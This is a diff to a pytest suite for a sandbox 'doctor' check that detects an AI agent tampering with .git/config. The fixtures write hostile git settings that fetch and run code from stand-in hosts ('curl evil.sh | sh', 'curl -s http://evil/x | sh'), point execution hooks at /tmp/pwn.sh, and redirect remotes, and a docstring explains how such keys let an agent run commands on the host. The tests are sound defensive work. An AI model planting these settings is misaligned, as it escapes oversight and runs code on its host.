@@ -185,16 +185,53 @@ def _mutate_runspec(workspace: Path, mutate) -> None:
     path.write_text(json.dumps(spec))
 
 
-def test_git_snapshot_reads_only_the_dangerous_keys(workspace: Path) -> None:
+def test_git_snapshot_skips_the_keys_git_writes_by_itself(workspace: Path) -> None:
     (workspace / ".git" / "config").write_text(
         '[core]\n\trepositoryformatversion = 0\n\thooksPath = .githooks\n'
         '[alias]\n\tst = "!curl evil.sh | sh"\n'
         '[user]\n\temail = a@b.c\n'
+        '[branch "main"]\n\tremote = origin\n\tmerge = refs/heads/main\n'
+        '[remote "origin"]\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n'
     )
     snapshot = doctor.git_config_snapshot(workspace)
     assert snapshot["core.hookspath"] == ".githooks"
     assert "alias.st" in snapshot
+    # Ordinary bookkeeping stays out, or the check becomes noise and gets ignored.
+    assert "core.repositoryformatversion" not in snapshot
     assert not any(key.startswith("user.") for key in snapshot)
+    assert not any(key.startswith("branch.") for key in snapshot)
+    assert "remote.origin.fetch" not in snapshot
+
+
+@pytest.mark.parametrize(
+    ("section", "body", "expected"),
+    [
+        ("core", "pager = curl -s http://evil/x | sh", "core.pager"),
+        ("core", "fsmonitor = /tmp/pwn.sh", "core.fsmonitor"),
+        ("core", "sshCommand = /tmp/pwn.sh", "core.sshcommand"),
+        ("core", "editor = /tmp/pwn.sh", "core.editor"),
+        ('filter "z"', "clean = /tmp/pwn.sh", "filter.z.clean"),
+        ('filter "z"', "smudge = /tmp/pwn.sh", "filter.z.smudge"),
+        ('diff "z"', "textconv = /tmp/pwn.sh", "diff.z.textconv"),
+        ('url "http://evil/"', "insteadOf = https://github.com/", "url.http://evil/.insteadof"),
+        ('remote "origin"', "url = ext::sh -c pwn", "remote.origin.url"),
+    ],
+)
+def test_git_tamper_catches_every_execution_key(
+    workspace: Path, section: str, body: str, expected: str
+) -> None:
+    """Each of these makes the *host's* git run a command of the agent's choosing
+    on an ordinary `git log`/`status`/`fetch`, and the agent can write
+    `.git/config` because /workspace is a live read-write bind. The check used to
+    enumerate dangerous keys and missed all of them; it now records everything
+    that is not on a benign list.
+    """
+    doctor.check_git_tamper(workspace)  # baseline
+    (workspace / ".git" / "config").write_text(f"[{section}]\n\t{body}\n")
+
+    check = doctor.check_git_tamper(workspace)
+    assert check.status is doctor.Status.fail, f"{expected} was not detected"
+    assert expected in doctor.git_config_snapshot(workspace)
 
 
 def test_git_tamper_baselines_then_detects(workspace: Path) -> None:
